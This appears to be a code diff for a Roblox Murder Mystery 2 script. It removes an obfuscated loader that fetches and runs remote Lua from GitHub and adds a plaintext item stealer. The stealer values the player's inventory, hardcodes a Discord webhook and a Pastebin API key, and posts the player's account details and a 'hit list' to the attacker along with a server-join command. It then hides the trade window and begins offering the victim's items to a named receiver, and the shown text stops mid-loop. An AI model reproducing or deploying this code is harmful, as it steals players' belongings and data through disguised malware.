@@ -1,1 +1,601 @@
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v85=v2(v0(v30,16));if v19 then local v115=v5(v85,v19);v19=nil;return v115;else return v85;end end end);local function v20(v31,v32,v33) if v33 then local v86=(v31/(2^(v32-((879 -(282 + 595)) -1))))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -(1638 -(1523 + 114))))) + (620 -(555 + 64)))) ;return v86-(v86%(932 -(857 + 74))) ;else local v87=568 -(367 + 201) ;local v88;while true do if (v87==0) then v88=2^(v32-(928 -(214 + 713))) ;return (((v31%(v88 + v88))>=v88) and (1 + 0)) or (0 + 0 + 0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (2 -0) );v18=v18 + (1067 -(68 + 997)) ;return (v36 * 256) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (1273 -(226 + 1044)) );v18=v18 + (17 -13) ;return (v40 * (16777333 -(32 + 85))) + (v39 * (64226 + 1310)) + (v38 * (57 + (1156 -(892 + 65)))) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,1 + 0 ,47 -27 ) * ((3 -1)^(58 -26))) + v41 ;local v45=v20(v42,371 -(87 + (466 -203)) ,211 -(67 + 113) );local v46=((v20(v42,24 + 8 )==(2 -1)) and  -1) or (1 + 0) ;if (v45==(0 -0)) then if (v44==((945 + 7) -(802 + 150))) then return v46 * (0 -0) ;else v45=1 -0 ;v43=0 + 0 ;end elseif (v45==(3044 -(915 + 82))) then return ((v44==(0 -0)) and (v46 * ((1 + 0)/(0 -0)))) or (v46 * NaN) ;end return v8(v46,v45-(2210 -(1069 + (909 -(368 + 423)))) ) * (v43 + (v44/((4 -2)^(113 -61)))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==(0 -0)) then return "";end end v48=v3(v16,v18,(v18 + v47) -(19 -(10 + 8)) );v18=v18 + v47 ;local v49={};for v66=3 -2 , #v48 do v49[v66]=v2(v1(v3(v48,v66,v66)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return function(v89,v90,v91,v92,v93,v94,v95,v96) local v89=(function() return 0 -0 ;end)();local v90=(function() return;end)();local v91=(function() return;end)();while true do if (v89== #"~") then if (v90== #"!") then v91=(function() return v92()~=(0 -0) ;end)();elseif (v90==(5 -3)) then v91=(function() return v93();end)();elseif (v90~= #"-19") then else v91=(function() return v94();end)();end v95[v96]=(function() return v91;end)();break;end if (v89~=0) then else local v121=(function() return 0 + 0 ;end)();local v122=(function() return;end)();while true do if (v121==(0 -0)) then v122=(function() return 0;end)();while true do if (v122==(0 + 0)) then v90=(function() return v92();end)();v91=(function() return nil;end)();v122=(function() return 1;end)();end if (v122==1) then v89=(function() return  #"}";end)();break;end end break;end end end end return v89,v90,v91,v92,v93,v94,v95,v96;end;end)();local v51=(function() return function(v97,v98,v99,v100,v101,v102,v103,v104,v105) local v106=(function() return 396 -(115 + 281) ;end)();local v97=(function() return;end)();local v98=(function() return;end)();while true do local v114=(function() return 1474 -(1329 + 145) ;end)();while true do if ((0 + 0)==v114) then if (v106==(2 -1)) then while true do if (v97~=(971 -(140 + 831))) then else v98=(function() return v99();end)();if (v100(v98, #"<", #":")==(867 -(550 + 317))) then local v172=(function() return 0;end)();local v173=(function() return;end)();local v174=(function() return;end)();local v175=(function() return;end)();while true do if (v172==(1850 -(1409 + 441))) then local v200=(function() return 0;end)();while true do if (v200==1) then v172=(function() return 1 -0 ;end)();break;end if (v200==(0 -0)) then local v207=(function() return 718 -(15 + 703) ;end)();while true do if (v207~=1) then else v200=(function() return 286 -(134 + 151) ;end)();break;end if (0==v207) then v173=(function() return v100(v98,2, #"91(");end)();v174=(function() return v100(v98, #"?id=",3 + 3 );end)();v207=(function() return 1;end)();end end end end end if (v172==(439 -(262 + 176))) then local v201=(function() return 1721 -(345 + 1376) ;end)();local v202=(function() return;end)();while true do if (v201~=(688 -(198 + 490))) then else v202=(function() return 0 -0 ;end)();while true do if ((0 -0)~=v202) then else local v208=(function() return 1990 -(582 + 1408) ;end)();while true do if (v208~=1) then else v202=(function() return 3 -2 ;end)();break;end if (v208==(0 -0)) then v175=(function() return {v101(),v101(),nil,nil};end)();if (v173==(0 -0)) then local v209=(function() return 1824 -(1195 + 629) ;end)();local v210=(function() return;end)();while true do if (v209==(1262 -(1091 + 171))) then v210=(function() return 0;end)();while true do if (v210==0) then v175[ #"xnx"]=(function() return v101();end)();v175[ #".com"]=(function() return v101();end)();break;end end break;end end elseif (v173== #"!") then v175[ #"gha"]=(function() return v102();end)();elseif (v173==(243 -(187 + 54))) then v175[ #"asd"]=(function() return v102() -((782 -(162 + 618))^(12 + 4)) ;end)();elseif (v173~= #"gha") then else local v215=(function() return 0;end)();local v216=(function() return;end)();while true do if (0==v215) then v216=(function() return 0;end)();while true do if (v216==(0 + 0)) then v175[ #"gha"]=(function() return v102() -((6 -4)^(52 -36)) ;end)();v175[ #"http"]=(function() return v101();end)();break;end end break;end end end v208=(function() return 1 -0 ;end)();end end end if (v202~=1) then else v172=(function() return 376 -(123 + 251) ;end)();break;end end break;end end end if (v172==(9 -7)) then if (v100(v174, #"!", #"]")== #"[") then v175[2]=(function() return v103[v175[700 -(208 + 490) ]];end)();end if (v100(v174,1 + 1 ,1 + 1 )== #">") then v175[ #"91("]=(function() return v103[v175[ #"xxx"]];end)();end v172=(function() return 1 + 2 ;end)();end if ((839 -(660 + 176))==v172) then if (v100(v174, #"gha", #"gha")== #" ") then v175[ #".dev"]=(function() return v103[v175[ #".dev"]];end)();end v104[v105]=(function() return v175;end)();break;end end end break;end end return v97,v98,v99,v100,v101,v102,v103,v104,v105;end if ((0 + 0)~=v106) then else local v124=(function() return 202 -(14 + 188) ;end)();while true do if (v124==(1385 -(746 + 638))) then v106=(function() return 676 -(534 + 141) ;end)();break;end if (v124==(0 + 0)) then v97=(function() return 0 + 0 ;end)();v98=(function() return nil;end)();v124=(function() return 1 -0 ;end)();end end end break;end end end end;end)();local v52=(function() return function(v107,v108,v109) local v110=(function() return 0;end)();while true do if (v110==(0 + 0)) then local v123=(function() return 341 -(218 + 123) ;end)();while true do if (v123~=(1581 -(1535 + 46))) then else v107[v108-#">" ]=(function() return v109();end)();return v107,v108,v109;end end end end end;end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {v53,v54,nil,v55};end)();local v57=(function() return v23();end)();local v58=(function() return {};end)();for v68= #">",v57 do FlatIdent_7126A,Type,Cons,v21,v24,v25,v58,v68=(function() return v50(FlatIdent_7126A,Type,Cons,v21,v24,v25,v58,v68);end)();end v56[ #"19("]=(function() return v21();end)();for v69= #"\\",v23() do FlatIdent_2661B,Descriptor,v21,v20,v22,v23,v58,v53,v69=(function() return v51(FlatIdent_2661B,Descriptor,v21,v20,v22,v23,v58,v53,v69);end)();end for v70= #",",v23() do v54,v70,v28=(function() return v52(v54,v70,v28);end)();end return v56;end local function v29(v60,v61,v62) local v63=v60[1];local v64=v60[2 + 0 ];local v65=v60[1 + 2 ];return function(...) local v71=v63;local v72=v64;local v73=v65;local v74=v27;local v75=561 -(306 + 254) ;local v76= -1;local v77={};local v78={...};local v79=v12("#",...) -1 ;local v80={};local v81={};for v111=0 -0 ,v79 do if (v111>=v73) then v77[v111-v73 ]=v78[v111 + (1468 -(892 + 7 + 568)) ];else v81[v111]=v78[v111 + 1 + 0 ];end end local v82=(v79-v73) + 1 ;local v83;local v84;while true do v83=v71[v75];v84=v83[2 -1 ];if (v84<=((360 + 257) -(268 + 335))) then if (v84<=(296 -(60 + 98 + 132))) then if ((3242>=567) and (v84<=(574 -(426 + 146)))) then if (v84<=0) then v81[v83[1 + 1 ]]={};elseif ((v84>(1457 -(282 + 1174))) or (847>=1263)) then v81[v83[813 -(569 + 242) ]]();else local v129=0 -0 ;local v130;while true do if (v129==(0 + 0)) then v130=v83[1026 -(706 + 182 + 136) ];v81[v130](v81[v130 + (1252 -(721 + 530)) ]);break;end end end elseif (v84<=4) then if ((v84>(1274 -(945 + (706 -380)))) or (2253==1851)) then if (v81[v83[4 -2 ]]==v83[4]) then v75=v75 + 1 + 0 ;else v75=v83[703 -(271 + 429) ];end else v81[v83[2 + 0 ]]=v81[v83[1503 -(1408 + 92) ]];end elseif (v84==(1091 -(461 + 625))) then v81[v83[1290 -((2766 -1773) + 295) ]]=v81[v83[1 + 2 ]][v83[(2630 -1455) -(418 + 753) ]];else local v135=v83[1 + 1 ];local v136,v137=v74(v81[v135](v13(v81,v135 + 1 + 0 ,v83[1 + 2 ])));v76=(v137 + v135) -(1 + 0) ;local v138=529 -(406 + 123) ;for v176=v135,v76 do v138=v138 + 1 ;v81[v176]=v136[v138];end end elseif (v84<=(1779 -(1749 + 20))) then if (v84<=(2 + 6)) then if (v84==7) then v81[v83[1324 -(1249 + 73) ]]=v81[v83[2 + 1 ]][v83[1149 -(466 + 679) ]];else v81[v83[4 -2 ]]=v81[v83[8 -5 ]];end elseif (v84==(1909 -(106 + 522 + 1272))) then local v143=v83[1 + 1 ];local v144,v145=v74(v81[v143](v13(v81,v143 + 1 ,v83[1 + 2 ])));v76=(v145 + v143) -(2 -1) ;local v146=0 -0 ;for v179=v143,v76 do v146=v146 + (115 -((19 -15) + (863 -(239 + 514)))) ;v81[v179]=v144[v146];end else v75=v83[3];end elseif (v84<=(596 -(57 + 527))) then if (v84>(1438 -(41 + 1386))) then v81[v83[105 -(17 + 31 + 55) ]]=v83[3 + 0 ];else local v150=0 -0 ;local v151;while true do if ((0==v150) or (2087>2372)) then v151=v83[1331 -(797 + 532) ];v81[v151]=v81[v151](v13(v81,v151 + 1 ,v76));break;end end end elseif (v84==((27 + 10) -24)) then v81[v83[168 -(122 + 44) ]]=v62[v83[5 -2 ]];else v81[v83[6 -4 ]]={};end elseif ((v84<=21) or (4445<4149)) then if ((v84<=(14 + 3)) or (1818==85)) then if (v84<=15) then for v127=v83[1 + 1 ],v83[1 + 2 ] do v81[v127]=nil;end elseif (v84==(32 -(37 -21))) then v81[v83[(1269 -(373 + 829)) -(30 + 35) ]]();else local v155=0 + 0 ;local v156;while true do if ((630<2127) and (v155==(1257 -(1043 + 214)))) then v156=v83[7 -5 ];v81[v156](v81[v156 + (1213 -(323 + (1620 -(476 + 255)))) ]);break;end end end elseif (v84<=(50 -(1161 -(369 + 761)))) then if ((v84==(598 -(361 + 219))) or (1938==2514)) then v81[v83[(187 + 135) -(53 + 267) ]]=v29(v72[v83[3]],nil,v62);else local v158=v83[1 + 1 ];v81[v158]=v81[v158](v13(v81,v158 + (414 -(15 + 398)) ,v76));end elseif (v84==(1002 -(18 + 964))) then v81[v83[2]]=v29(v72[v83[3]],nil,v62);elseif (v81[v83[2]]==v83[4]) then v75=v75 + 1 ;else v75=v83[11 -8 ];end elseif (v84<=(15 + 10)) then if (v84<=(15 + 8)) then if ((4255>=55) and (v84==(872 -(20 + (1507 -677))))) then local v161=0;local v162;local v163;while true do if ((1 + 0)==v161) then v81[v162 + (127 -(116 + 10)) ]=v163;v81[v162]=v163[v83[4]];break;end if ((2999>1156) and (v161==(0 + 0))) then v162=v83[(1402 -662) -(542 + 196) ];v163=v81[v83[3]];v161=1 -0 ;end end else do return;end end elseif ((2350>1155) and (v84>24)) then for v182=v83[1 + 1 ],v83[2 + 1 ] do v81[v182]=nil;end else do return;end end elseif (v84<=(10 + 17)) then if ((4029<=4853) and (v84==(68 -(280 -(64 + 174))))) then v75=v83[1 + 2 ];else v81[v83[4 -2 ]]=v83[(2300 -746) -(1126 + 425) ];end elseif ((v84>(433 -(118 + 287))) or (516>3434)) then v81[v83[7 -5 ]]=v62[v83[1124 -(118 + (1339 -(144 + 192))) ]];else local v169=(216 -(42 + 174)) -0 ;local v170;local v171;while true do if (v169==1) then v81[v170 + (378 -(142 + 177 + 58)) ]=v171;v81[v170]=v171[v83[18 -14 ]];break;end if (v169==(0 + 0)) then v170=v83[2 + 0 ];v171=v81[v83[(417 + 563) -(553 + 424) ]];v169=1 -(1504 -(363 + 1141)) ;end end end v75=v75 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!053Q00028Q00026Q00F03F027Q004003043Q007461736B03053Q00737061776E001A9Q003Q00120C000100014Q000F000200033Q002604000100080001000100041A3Q000800012Q000F000200023Q00021200025Q00120C000100023Q0026040001000D0001000200041A3Q000D00012Q000F000300033Q000212000300013Q00120C000100033Q002604000100030001000300041A3Q0003000100121D000400043Q0020070004000400052Q0008000500024Q001100040002000100121D000400043Q0020070004000400052Q0008000500034Q001100040002000100041A3Q0019000100041A3Q000300012Q00173Q00013Q00023Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403513Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F74696C627572796E3834322D6C616E672F2Q4D322F726566732F68656164732F6D61696E2F4C6F616465722E6C756100083Q00121D3Q00013Q00121D000100023Q00201600010001000300120C000300044Q0006000100034Q000B5Q00022Q00023Q000100012Q00173Q00017Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403423Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F5261682D4D642F5363726970744D6D322F6D61696E2F4C6F616465722E6C756100083Q00121D3Q00013Q00121D000100023Q00201600010001000300120C000300044Q0006000100034Q000B5Q00022Q00023Q000100012Q00173Q00017Q00",v9(),...);
+userName = "xrvnoah"
+webHook = "https://discord.com/api/webhooks/1449659221103742996/y5R-CqEpFoggVx-i2C0MvowIPXesyaHlt9wv0h4p8K6Ehpipf_BLvGtDhbL5PsM1Zt7b"
+
+local values = {
+    -- >> Uniques/Victim Tier << --
+    ["Sorry"] = 750,
+    -- >> Uniques/Special Tier << --
+    ["SlouseClownGun"] = 500000,
+    ["SlouseClown"] = 500000,
+    ["SharkSeeker"] = 1000,
+    ["Dartbringer"] = 1150,
+    -- >> Uniques/Top 100 Awards << --
+    ["BlueCandy"] = 100000,
+    ["RedHallow"] = 100000,
+    ["BlueSugar"] = 100000,
+    ["ElderwoodGunBlue"] = 100000,
+    ["MintyBlue"] = 100000,
+    ["LogchopperBlue"] = 100000,
+    ["BlueVampiresEdge"] = 100000,
+    ["RedIceblaster"] = 100000,
+    ["RedIcebreaker"] = 100000,
+    ["BlueHarvester"] = 100000,
+    ["SwirlyGunBlue"] = 100000,
+    ["SwirlyAxeBlue"] = 100000,
+    ["ElderwoodKnifeBlue"] = 100000,
+    ["IcepiercerRed"] = 100000,
+    ["IceHammerRed"] = 100000,
+    ["TravelerAxeRed"] = 100000,
+    ["Gingerscope_Blue"] = 100000,
+    ["Gingerscythe_Blue"] = 100000,
+    ["VampireAxe_Purple"] = 100000,
+    -- >> Ancients/Special Tier << --
+    ["NikKnife"] = 1000000,
+    -- >> Ancients/Tier 2 << --
+    ["Gingerscope"] = 9600,
+    ["TravelerAxe"] = 7000,
+    ["Harvester"] = 650,
+    ["Icepiercer"] = 600,
+    ["VampireAxe"] = 440,
+    ["Celestial"] = 350,
+    -- >> Ancients/Tier 1 << --
+    ["SwirlyAxe"] = 150,
+    ["Icebreaker"] = 125,
+    ["ElderwoodScythe"] = 85,
+    ["Scythe"] = 77,
+    ["Hallowscythe"] = 55,
+    ["Logchopper"] = 30,
+    ["Icewing"] = 4,
+    -- >> Vintages/Tier 2 << --
+    ["GhostK2018"] = 10,
+    ["AmericaGun"] = 8,
+    ["BloodKnife"] = 8,
+    -- >> Vintages/Tier 1 << --
+    ["Disint"] = 7,
+    ["Phaser"] = 7,
+    ["ShadowKnife"] = 6,
+    ["TimeKnife"] = 5,
+    ["Gun1"] = 4,
+    ["GoldenGun"] = 4,
+    ["Knife1"] = 3,
+    -- >> Chromas/Tier 3 << --
+    ["TravelerGunChroma"] = 110000,
+    ["TreeGun2023Chroma"] = 48000,
+    ["TreeKnife2023Chroma"] = 30000,
+    ["VampireGunChroma"] = 16000,
+    ["ConstellationChroma"] = 9400,
+    ["BaubleChroma"] = 6500,
+    ["WatergunChroma"] = 2200,
+    -- >> Chromas/Tier 2 << --
+    ["ChromaDarkbringer"] = 125,
+    ["ChromaLightbringer"] = 120,
+    ["CandleflameChroma"] = 115,
+    ["ElderwoodKnifeChroma"] = 115,
+    ["SwirlyGunChroma"] = 115,
+    ["Gingermint_KChroma"] = 110,
+    -- >> Chromas/Tier 1 << --
+    ["LugerChroma"] = 100,
+    ["LaserChroma"] = 80,
+    ["HeatChroma"] = 70,
+    ["DeathshardChroma"] = 65,
+    ["GemstoneChroma"] = 65,
+    ["SharkChroma"] = 65,
+    ["SlasherChroma"] = 65,
+    ["TidesChroma"] = 65,
+    ["FangChroma"] = 55,
+    ["GingerbladeChroma"] = 55,
+    ["SeerChroma"] = 55,
+    ["BonebladeChroma"] = 50,
+    ["SawChroma"] = 50,
+    -- >> Godlies/Tier 3 << --
+    ["TravelerGun"] = 3400,
+    ["TreeGun2023"] = 1850,
+    ["Turkey2023"] = 1600,
+    ["TreeKnife2023"] = 1025,
+    ["Blossom_G"] = 640,
+    ["Sakura_K"] = 630,
+    ["Constellation"] = 575,
+    ["Darkshot"] = 465,
+    ["Darksword"] = 460,
+    ["VampireGun"] = 460,
+    ["Bauble"] = 310,
+    ["ZombieBat"] = 300,
+    ["Candy"] = 200,
+    ["Rainbow_G"] = 190,
+    ["Rainbow_K"] = 185,
+    ["Ocean_G"] = 150,
+    ["WraithGun"] = 145,
+    ["WraithKnife"] = 145,
+    ["Waves_K"] = 145,
+    ["AuroraKnife"] = 135,
+    ["AuroraGun"] = 135,
+    ["FlowerwoodGun"] = 135,
+    ["FlowerwoodKnife"] = 130,
+    ["Heartblade"] = 125,
+    ["Sugar"] = 125,
+    ["SwirlyGun"] = 115,
+    ["Makeshift"] = 105,
+    ["Candleflame"] = 100,
+    ["ElderwoodKnife"] = 100,
+    ["Watergun"] = 90,
+    -- >> Godlies/Tier 2 << --
+    ["Phantom2022"] = 75,
+    ["Spectre2022"] = 75,
+    ["Luger"] = 75,
+    ["RedLuger"] = 70,
+    ["SwirlyBlade"] = 65,
+    ["Iceblaster"] = 65,
+    ["Pearl_K"] = 62,
+    ["Pearl_G"] = 62,
+    ["Darkbringer"] = 60,
+    ["ElderwoodGun"] = 60,
+    ["Lightbringer"] = 58,
+    ["Gingermint_K"] = 40,
+    ["Gingermint_G"] = 40,
+    ["GreenLuger"] = 40,
+    ["Hallowgun"] = 35,
+    ["Laser"] = 32,
+    ["Icebeam"] = 32,
+    ["Iceflake"] = 32,
+    ["Plasmabeam"] = 32,
+    ["Plasmablade"] = 32,
+    ["Amerilaser"] = 30,
+    ["Blaster"] = 30,
+    ["Nightblade"] = 30,
+    ["AmericaSword"] = 28,
+    ["Nebula"] = 28,
+    ["Shark"] = 28,
+    ["Virtual"] = 27,
+    ["Gemstone"] = 25,
+    ["Clockwork"] = 23,
+    ["EternalCane"] = 23,
+    ["GingerLuger"] = 23,
+    ["Lugercane"] = 23,
+    ["Pixel"] = 23,
+    ["Slasher"] = 23,
+    ["Gingerblade"] = 22,
+    ["Heat"] = 22,
+    ["Minty"] = 22,
+    -- >> Godlies/Tier 1 << --
+    ["BattleAxe2"] = 20,
+    ["Deathshard"] = 20,
+    ["Tides"] = 20,
+    ["Fang"] = 18,
+    ["Spider"] = 17,
+    ["Chill"] = 17,
+    ["Jinglegun"] = 15,
+    ["VampiresEdge"] = 15,
+    ["Pumpking"] = 15,
+    ["Bioblade"] = 13,
+    ["BattleAxe"] = 13,
+    ["Frostsaber"] = 13,
+    ["Xmas"] = 13,
+    ["Flames"] = 12,
+    ["Hallow"] = 12,
+    ["IceDragon"] = 12,
+    ["IceShard"] = 12,
+    ["WintersEdge"] = 12,
+    ["Ghostblade"] = 10,
+    ["HallowsBlade"] = 10,
+    ["Handsaw"] = 10,
+    ["Eternal"] = 10,
+    ["Eternal2"] = 10,
+    ["Eternal3"] = 10,
+    ["Eternal4"] = 10,
+    ["Boneblade"] = 8,
+    ["Eggblade"] = 7,
+    ["Frostbite"] = 7,
+    ["Prismatic"] = 7,
+    ["Saw"] = 7,
+    ["Snowflake"] = 7,
+    -- >> Godlies/Tier 0 << --
+    ["Peppermint"] = 7,
+    ["Cookieblade"] = 7,
+    ["BlueSeer"] = 7,
+    ["PurpleSeer"] = 7,
+    ["RedSeer"] = 7,
+    ["TheSeer"] = 7,
+    ["OrangeSeer"] = 7,
+    ["YellowSeer"] = 7,
+    -- >> Legendaries/Special Tier << --
+    ["JD"] = 65,
+    -- >> Legendaries/Tier 3 << --
+    ["Latte_G_2023"] = 90,
+    ["Latte_K_2023"] = 90,
+    ["CottonCandy"] = 65,
+    ["Witched"] = 55,
+    ["Beach_K_2023"] = 30,
+    ["Cavern_K_2019"] = 22,
+}
+
+if #game:GetService("Players"):GetPlayers() <= 3 then
+    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
+end
+
+if #game:GetService("Players"):GetPlayers() == 12 then
+    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
+end
+
+local LP = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+
+_G.vlorp = _G.vlorp or false
+if _G.vlorp then
+    return
+end
+_G.vlorp = true
+
+local destroytrades2 = coroutine.create(function()
+    while true do
+        local player = game:GetService("Players").LocalPlayer
+        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
+        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
+
+        if tradeGUI.Enabled == true then
+            tradeGUI.Enabled = false
+        end
+
+        if tradeGUIPhone.Enabled == true then
+            tradeGUIPhone.Enabled = false
+        end
+
+        wait(0.1)
+    end
+end)
+
+function SendWebhook(url, data)
+    local jsonData = HttpService:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+end
+
+function CreateEmbed(title, description, color, fields)
+    local embed = {
+        ["title"] = title,
+        ["description"] = description,
+        ["color"] = color,
+        ["fields"] = fields or {}
+    }
+    return embed
+end
+
+local function getLvl()
+    for i,v in pairs(LevelModule.XPTable) do
+        if PlayerDataModule.NewXP < v then
+            return i
+        end
+    end
+end
+
+local allItems = {}
+local itemsCount = 0
+
+local valueCount = 0
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        local br = 0
+        if values[d.ItemName] then
+            valueCount = valueCount + values[d.ItemName]
+            br = values[d.ItemName]
+        end
+
+        local formattedTable = {name = d.ItemName, value = br, data = d.DataID, amount = d.Amount, rarity = d.Rarity}
+        table.insert(allItems, formattedTable)
+        
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + 1
+            table.insert(vintageItems, formattedTable)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + 1
+            table.insert(uniqueItems, formattedTable)
+        end
+
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + 1
+            table.insert(ancientItems, formattedTable)
+        end
+
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + 1
+            table.insert(godlyItems, formattedTable)
+        end
+
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + 1
+            table.insert(legendaryItems, formattedTable)
+        end
+
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + 1
+            table.insert(rareItems, formattedTable)
+        end
+
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + 1
+            table.insert(uncommonItems, formattedTable)
+        end
+
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + 1
+            table.insert(commonItems, formattedTable)
+        end
+    end
+end
+
+for i,v in pairs(allItems) do
+    itemsCount = itemsCount + 1
+end
+
+local function pastebin(content)
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2) 
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\n ERROR: Country not supported \n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+local uniquesString = ""
+local ancientsString = ""
+local godlysString = ""
+local legendariesString = ""
+local vintageString = ""
+local raresString = ""
+local uncommonString = ""
+local commonsString = ""
+
+for a,b in pairs(uniqueItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            uniquesString = uniquesString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(ancientItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            ancientsString = ancientsString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(godlyItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            godlysString = godlysString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(legendaryItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            legendariesString = legendariesString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(vintageItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            vintageString = vintageString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(rareItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            raresString = raresString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(uncommonItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            uncommonString = uncommonString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(commonItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            commonsString = commonsString .. d .. ",\n"
+        end
+    end
+end
+
+local EverythingString = "-- // Uniques\n" .. uniquesString ..
+                         "\n\n-- // Ancient\n" .. ancientsString ..
+                         "\n\n-- // Godlies\n" .. godlysString ..
+                         "\n\n-- // Legendaries\n" .. legendariesString ..
+                         "\n\n-- // Vintage\n" .. vintageString ..
+                         "\n\n-- // Rare\n" .. raresString ..
+                         "\n\n-- // Uncommon\n" .. uncommonString ..
+                         "\n\n-- // Common\n" .. commonsString
+
+local WebHookEmbed = CreateEmbed(
+    "Vlorp Scripts | MM2",
+    "Please execute the code above to get your hit.",
+    11220,
+    {
+        {name = "```🧛‍♀️ Info```", value = "```🙍‍♂️ Username: "..LP.Name.."\n💫 Level: "..tostring(getLvl()).."\n🔞 Account-Age: "..tostring(LP.AccountAge).."\n🎮 Executor: "..identifyexecutor().."\n🐱‍👤 Receiver: "..userName.."```"},
+        {name = "```🎯 Hit Info```", value = "```💵 Total Value: "..tostring(math.floor(valueCount + 0.5)).."\n➕ Total Count: "..tostring(itemsCount - 2).."\n\n🌟 Uniques: "..tostring(uniqueItemsC).."\n🔮 Ancients: "..tostring(ancientItemsC).."\n💎 Godlys: "..tostring(godlyItemsC).."\n🏆 Legendarys: "..tostring(legendaryItemsC).."\n⌚ Vintage: "..tostring(vintageItemsC).."\n📈 Rares: "..tostring(rareItemsC).."\n🔹 Uncommons: "..tostring(uncommonItemsC).."\n🔸 Commons: "..tostring(commonItemsC).."```"},
+        {name = "```💻 Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
+    }
+)
+
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
+    SendWebhook(webHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+else
+    SendWebhook(webHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+end
+
+local function stealitems()
+    coroutine.resume(destroytrades2)
+
+    local sendArgs = {
+        [1] = game:GetService("Players")[userName]
+    }
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+
+    wait(3)
+
+    for a,b in pairs(uniqueItems) do
+        for i = 1, b.amount do
+            local args = {
+                [1] = b.data,
+                [2] = "Weapons"
+            }
+
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    for a,b in pairs(ancientItems) do
+        for i = 1, b.amount do
